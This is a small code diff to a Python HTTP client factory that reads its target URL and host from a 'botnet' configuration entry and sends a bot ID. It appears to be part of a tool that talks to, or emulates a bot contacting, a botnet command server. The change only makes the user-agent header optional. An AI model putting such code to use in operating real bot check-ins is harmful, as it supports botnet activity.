@@ -137,7 +137,10 @@ class HTTPClientFactory(protocol.ClientFactory):
         self.cookies = {}
         self.url = self.config['botnet']
         self.host = self.config['botnet']
-        self.agent = self.config['useragent']
+        if self.config['useragent'] == "None":
+            self.agent = ""
+        else:
+            self.agent = self.config['useragent']
         self.path = self.config['path']
         self.method = self.config['method']
         self.req = urllib.urlencode({self.config['id_grammar']: self.config['id'], 
